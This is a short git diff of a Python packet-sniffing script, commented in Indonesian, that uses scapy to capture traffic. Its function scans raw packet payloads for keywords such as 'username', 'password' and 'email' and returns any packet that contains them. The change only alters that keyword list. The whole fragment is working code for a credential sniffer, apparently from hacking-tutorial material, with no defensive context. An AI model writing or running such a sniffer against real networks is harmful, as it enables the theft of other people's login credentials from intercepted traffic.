@@ -17,7 +17,7 @@ def get_url(packet): # funct untuk mengambil url website
 def get_login_info(packet): # funct untuk mengambil username / password
     if packet.haslayer(scapy.Raw): # kita membuat pengecekan ini untuk bisa langsung mencaputure bagian Raw yang dimana berisi username dan password
             load = str(packet[scapy.Raw].load) # artinya kita akan mencetak packet pada layer/bagian Raw dengan field (kolom) load
-            keywords = [b"username", "user", "login", "uname", "password", "pass", "passwd", "email"] # membuat kata kunci sebagai triger untuk menangkap setiap paket yang sama seperti kata kunci tersbut untuk ditampilkan.  
+            keywords = ["username", "user", "login", "uname", "password", "pass", "passwd", "email"] # membuat kata kunci sebagai triger untuk menangkap setiap paket yang sama seperti kata kunci tersbut untuk ditampilkan.  
             for keyword in keywords: # loop sebanyak keywords
                 if keyword in load: # cek jika keyword sama dengan isi dari var load
                     return load # kembalikan value load
